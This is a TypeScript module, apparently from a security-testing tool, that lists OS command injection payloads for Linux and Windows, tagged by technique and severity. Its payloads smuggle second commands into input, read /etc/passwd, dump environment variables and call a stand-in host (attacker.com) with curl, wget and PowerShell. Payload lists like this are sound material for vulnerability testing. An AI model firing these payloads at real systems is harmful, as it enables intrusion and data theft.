/**
 * Command Injection Payloads
 * Payloads for testing OS command injection vulnerabilities
 */

export interface CommandInjectionPayload {
  payload: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  os?: 'linux' | 'windows' | 'unix';
  technique: 'basic' | 'chaining' | 'encoding' | 'time-based';
}

export const COMMAND_INJECTION_PAYLOADS: CommandInjectionPayload[] = [
  // Basic command injection (Linux/Unix)
  {
    payload: "; ls",
    description: "Basic command chaining with semicolon",
    severity: 'critical',
    os: 'linux',
    technique: 'basic',
  },
  {
    payload: "| ls",
    description: "Command chaining with pipe",
    severity: 'critical',
    os: 'linux',
    technique: 'chaining',
  },
  {
    payload: "&& ls",
    description: "Command chaining with AND operator",
    severity: 'critical',
    os: 'linux',
    technique: 'chaining',
  },
  {
    payload: "|| ls",
    description: "Command chaining with OR operator",
    severity: 'critical',
    os: 'linux',
    technique: 'chaining',
  },
  {
    payload: "`ls`",
    description: "Command substitution with backticks",
    severity: 'critical',
    os: 'linux',
    technique: 'basic',
  },
  {
    payload: "$(ls)",
    description: "Command substitution with $()",
    severity: 'critical',
    os: 'linux',
    technique: 'basic',
  },
  
  // Windows command injection
  {
    payload: "& dir",
    description: "Windows command chaining with &",
    severity: 'critical',
    os: 'windows',
    technique: 'chaining',
  },
  {
    payload: "| dir",
    description: "Windows command chaining with pipe",
    severity: 'critical',
    os: 'windows',
    technique: 'chaining',
  },
  {
    payload: "&& dir",
    description: "Windows command chaining with &&",
    severity: 'critical',
    os: 'windows',
    technique: 'chaining',
  },
  {
    payload: "|| dir",
    description: "Windows command chaining with ||",
    severity: 'critical',
    os: 'windows',
    technique: 'chaining',
  },
  {
    payload: "%COMSPEC% /c dir",
    description: "Windows using COMSPEC variable",
    severity: 'high',
    os: 'windows',
    technique: 'basic',
  },
  
  // Time-based detection
  {
    payload: "; sleep 5",
    description: "Time-based detection (Linux)",
    severity: 'high',
    os: 'linux',
    technique: 'time-based',
  },
  {
    payload: "| sleep 5",
    description: "Time-based detection with pipe",
    severity: 'high',
    os: 'linux',
    technique: 'time-based',
  },
  {
    payload: "& timeout /t 5",
    description: "Time-based detection (Windows)",
    severity: 'high',
    os: 'windows',
    technique: 'time-based',
  },
  
  // Encoding-based injection
  {
    payload: "%3B%20ls",
    description: "URL-encoded semicolon and command",
    severity: 'high',
    os: 'linux',
    technique: 'encoding',
  },
  {
    payload: "\\x3b ls",
    description: "Hex-encoded semicolon",
    severity: 'high',
    os: 'linux',
    technique: 'encoding',
  },
  {
    payload: "'; ls #",
    description: "SQL-style injection with command",
    severity: 'high',
    os: 'linux',
    technique: 'basic',
  },
  
  // File system operations
  {
    payload: "; cat /etc/passwd",
    description: "Read sensitive file (Linux)",
    severity: 'critical',
    os: 'linux',
    technique: 'basic',
  },
  {
    payload: "| cat /etc/passwd",
    description: "Read sensitive file with pipe",
    severity: 'critical',
    os: 'linux',
    technique: 'chaining',
  },
  {
    payload: "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    description: "Read sensitive file (Windows)",
    severity: 'critical',
    os: 'windows',
    technique: 'basic',
  },
  
  // Network operations
  {
    payload: "; curl http://attacker.com/",
    description: "Outbound network request",
    severity: 'high',
    os: 'linux',
    technique: 'basic',
  },
  {
    payload: "| wget http://attacker.com/",
    description: "Outbound network request with wget",
    severity: 'high',
    os: 'linux',
    technique: 'chaining',
  },
  {
    payload: "& powershell -Command Invoke-WebRequest http://attacker.com/",
    description: "Outbound network request (Windows PowerShell)",
    severity: 'high',
    os: 'windows',
    technique: 'basic',
  },
  
  // Environment variable access
  {
    payload: "; env",
    description: "List environment variables",
    severity: 'medium',
    os: 'linux',
    technique: 'basic',
  },
  {
    payload: "& set",
    description: "List environment variables (Windows)",
    severity: 'medium',
    os: 'windows',
    technique: 'basic',
  },
  {
    payload: "; echo $PATH",
    description: "Access PATH environment variable",
    severity: 'medium',
    os: 'linux',
    technique: 'basic',
  },
  
  // Process information
  {
    payload: "; ps aux",
    description: "List running processes",
    severity: 'medium',
    os: 'linux',
    technique: 'basic',
  },
  {
    payload: "& tasklist",
    description: "List running processes (Windows)",
    severity: 'medium',
    os: 'windows',
    technique: 'basic',
  },
  
  // Nested command injection
  {
    payload: "; $(echo 'ls')",
    description: "Nested command substitution",
    severity: 'high',
    os: 'linux',
    technique: 'chaining',
  },
  {
    payload: "| $(cat /etc/passwd)",
    description: "Command substitution with file read",
    severity: 'critical',
    os: 'linux',
    technique: 'chaining',
  },
];

/**
 * Get command injection payloads filtered by OS
 */
export function getCommandInjectionPayloads(os?: string): CommandInjectionPayload[] {
  if (!os) {
    return COMMAND_INJECTION_PAYLOADS;
  }
  return COMMAND_INJECTION_PAYLOADS.filter(
    p => !p.os || p.os.toLowerCase() === os.toLowerCase()
  );
}

/**
 * Get command injection payloads by technique
 */
export function getCommandInjectionPayloadsByTechnique(technique: string): CommandInjectionPayload[] {
  return COMMAND_INJECTION_PAYLOADS.filter(p => p.technique === technique);
}

